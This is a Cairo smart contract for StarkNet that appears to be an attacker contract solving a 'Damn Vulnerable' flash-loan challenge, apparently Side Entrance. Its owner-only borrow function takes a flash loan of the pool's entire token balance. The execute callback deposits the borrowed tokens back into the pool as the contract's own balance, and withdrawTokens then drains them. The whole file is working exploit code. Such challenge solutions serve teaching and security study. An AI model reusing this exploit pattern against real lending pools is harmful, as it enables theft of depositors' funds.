%lang starknet

from starkware.cairo.common.math import assert_nn, assert_not_zero
from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.starknet.common.syscalls import get_caller_address, get_contract_address
from starkware.cairo.common.uint256 import (
    Uint256,
    uint256_le,
    uint256_add,
    assert_uint256_eq,
    uint256_sub,
)
from openzeppelin.token.erc20.library import ERC20
from openzeppelin.token.erc20.IERC20 import IERC20

@contract_interface
namespace ISELP {
    func depositTokens(amount: Uint256) {
    }
    func withdrawTokens() {
    }
    func userBalance(account: felt) -> (amount: Uint256) {
    }

    func flashLoan(amount: Uint256) {
    }

    func pool_Balance() -> (amount: Uint256) {
    }
}

@contract_interface
namespace IDAMN {
    func transfer(to_address: felt, value: Uint256) {
    }

    func transferFrom(from_address: felt, to_address: felt, value: Uint256) {
    }

    func allowance(owner: felt, spender: felt) -> (res: Uint256) {
    }

    func balanceOf(user: felt) -> (res: Uint256) {
    }
}

@storage_var
func _pool() -> (res: felt) {
}

@storage_var
func _owner() -> (res: felt) {
}

@storage_var
func _damnVToken() -> (res: felt) {
}

@view
func pool_addr{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() -> (res: felt) {
    let (res) = _pool.read();
    return (res,);
}

@view
func owner{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() -> (res: felt) {
    let (res) = _owner.read();
    return (res,);
}

@constructor
func constructor{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    poolAddr: felt, damnVT: felt
) {
    assert_not_zero(poolAddr);
    _pool.write(poolAddr);
    assert_not_zero(damnVT);
    _damnVToken.write(damnVT);
    let (caller) = get_caller_address();
    _owner.write(caller);

    return ();
}

@external
func execute{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    let (pool_contract) = _pool.read();
    let (caller) = get_caller_address();
    let (contract_address) = get_contract_address();
    assert caller = pool_contract;
    let zero_as_uint256: Uint256 = Uint256(0, 0);
    let (DamnVT) = _damnVToken.read();
    let (deposit_amount) = IERC20.balanceOf(DamnVT, contract_address);
    let (amount_deposited) = uint256_le(deposit_amount, zero_as_uint256);
    assert amount_deposited = 0;

    IERC20.approve(DamnVT, pool_contract, deposit_amount);
    ISELP.depositTokens(pool_contract, deposit_amount);

    return ();
}

@external
func borrow{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    let (pool_contract) = _pool.read();
    let (caller) = get_caller_address();
    let (owner) = _owner.read();
    assert caller = owner;
    let (DamnVT) = _damnVToken.read();
    let (pool_bal) = IERC20.balanceOf(DamnVT, pool_contract);

    ISELP.flashLoan(pool_contract, pool_bal);

    ISELP.withdrawTokens(pool_contract);

    return ();
}
